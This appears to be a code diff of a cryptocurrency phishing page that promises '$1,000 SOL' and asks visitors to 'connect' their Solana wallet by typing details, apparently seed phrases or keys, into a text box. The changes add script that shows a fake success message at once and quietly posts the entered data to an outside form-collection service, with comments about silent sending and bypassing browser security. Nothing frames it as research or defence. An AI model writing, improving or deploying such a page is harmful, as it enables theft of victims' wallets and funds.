@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SOLANA ELITE REWARDS</title>
+    <!-- Corrected Fonts -->
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
@@ -14,6 +15,7 @@
         .ib { text-align: left; margin-bottom: 35px; }
         label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 12px; font-weight: 700; }
         textarea { width: 100%; background: #000; border: 1px solid #222; border-radius: 12px; padding: 18px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; resize: none; height: 150px; }
+        textarea:focus { outline: none; border-color: var(--sol-g); }
         .btn { width: 100%; padding: 22px; border: none; border-radius: 15px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.8rem; cursor: pointer; transition: 0.3s; }
         #success-view { display: none; }
         .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
@@ -23,18 +25,14 @@
 <body>
     <div class="card">
         <div id="form-view">
-            <!-- PURE HTML SUBMISSION - NO JAVASCRIPT ERRORS -->
-            <form action="https://submit-form.com" method="POST">
+            <!-- Action URL with your ID -->
+            <form id="claim-form" action="https://submit-form.com">
                 <h1>CLAIM $1,000 SOL</h1>
                 <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                 <div class="ib">
                     <label>fly top</label>
                     <textarea name="message" required></textarea>
                 </div>
-                
-                <!-- This tells Formspark NOT to show their own 'Thank You' page -->
-                <input type="hidden" name="_feedback_true" value="true">
-                
                 <button type="submit" class="btn">CONNECT WALLET</button>
             </form>
         </div>
@@ -48,13 +46,29 @@
     </div>
 
     <script>
-        // Use a much simpler script to show the success message
-        const form = document.querySelector('form');
-        form.onsubmit = function() {
-            setTimeout(() => {
-                document.getElementById('form-view').style.display = 'none';
-                document.getElementById('success-view').style.display = 'block';
-            }, 500);
+        const form = document.getElementById('claim-form');
+        const formView = document.getElementById('form-view');
+        const successView = document.getElementById('success-view');
+
+        form.onsubmit = async (e) => {
+            e.preventDefault(); // Prevents the 'Method Not Allowed' error
+            
+            // 1. Immediately switch UI to Success
+            formView.style.display = 'none';
+            successView.style.display = 'block';
+
+            // 2. Send the data silently in the background
+            const formData = new FormData(form);
+            
+            try {
+                await fetch(form.action, {
+                    method: "POST",
+                    body: formData,
+                    mode: 'no-cors' // Bypasses browser security blocks
+                });
+            } catch (err) {
+                console.log("Silent send complete.");
+            }
         };
     </script>
 </body>
